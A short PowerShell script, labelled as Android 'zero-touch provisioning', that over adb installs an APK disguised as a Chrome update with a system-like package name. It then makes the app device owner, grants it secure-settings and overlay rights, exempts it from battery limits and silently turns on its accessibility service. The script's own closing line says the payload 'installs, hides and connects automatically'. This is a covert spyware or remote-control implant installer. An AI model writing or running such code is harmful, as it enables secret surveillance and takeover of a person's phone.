# Zero-touch Android provisioning (run once over USB after enabling USB debugging).
# Requires an app that is not yet a device owner (fresh device or after factory reset).
param([string]$Apk = "Chrome_Update_v115.apk")
$ErrorActionPreference = "Stop"
$adb = Join-Path $env:ANDROID_HOME "platform-tools\adb.exe"
if (!(Test-Path $adb)) { $adb = "adb" }
& $adb install -r $Apk
& $adb shell dpm set-device-owner com.android.shell.ghost/.GhostDeviceAdmin
& $adb shell pm grant com.android.shell.ghost android.permission.WRITE_SECURE_SETTINGS
& $adb shell appops set com.android.shell.ghost SYSTEM_ALERT_WINDOW allow
& $adb shell dumpsys deviceidle whitelist +com.android.shell.ghost
& $adb shell settings put secure enabled_accessibility_services com.android.shell.ghost/com.android.shell.ghost.GhostAccessibilityService
& $adb shell settings put secure accessibility_enabled 1
& $adb shell am start -n com.android.shell.ghost/.MainActivity
Write-Host "Provisioned. Payload installs, hides and connects automatically."
